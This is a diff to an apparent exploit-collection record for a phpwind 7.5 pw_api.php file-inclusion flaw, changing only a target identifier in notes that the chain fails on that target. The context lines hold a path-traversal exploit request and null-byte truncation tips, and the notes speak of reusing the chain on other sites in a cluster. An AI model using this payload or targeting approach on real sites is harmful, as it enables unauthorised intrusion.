@@ -9,7 +9,7 @@
 - **language**: http
 - **source**: web
 - **source_url**: https://blog.csdn.net/weixin_39912163/article/details/116077547
-- **verified_note**: 未在目标实测（情报角色零请求）。**本条在 tgt3090 上已判定不可用**：任务给定前提「UCenter/windid/api 接口全 404，本版本不集成 UCenter」。保留作站群其它 phpwind 7.x 复用。
+- **verified_note**: 未在目标实测（情报角色零请求）。**本条在 moh6hrwx4t 上已判定不可用**：任务给定前提「UCenter/windid/api 接口全 404，本版本不集成 UCenter」。保留作站群其它 phpwind 7.x 复用。
 - **path**: pocs/phpwind-7.5-pw_api.php-api-class_base.php-mode-未过滤任意文件包含-来自-_post-_get-不依赖-regis/poc.http
 - **created_at**: 2026-10-06T11:26:33.974Z
 - **found_by**: exploit
@@ -95,6 +95,6 @@ GET /pw_api.php?mode=../../data/bbscache/bank_sort&method=x&type=uc&sig=<自算>
 #    （PHP<5.3 可 %00 截断；5.3+ 用路径穿越到已存在的 .php）
 
 ### 目标适用性（重要，避免白打）
-# 目标 /bbs/api/ 全目录 404（本版本不集成 UCenter）→ 本链在 tgt3090 上不可用，仅作站群其它 phpwind 7.x 复用。
+# 目标 /bbs/api/ 全目录 404（本版本不集成 UCenter）→ 本链在 moh6hrwx4t 上不可用，仅作站群其它 phpwind 7.x 复用。
 
 ```
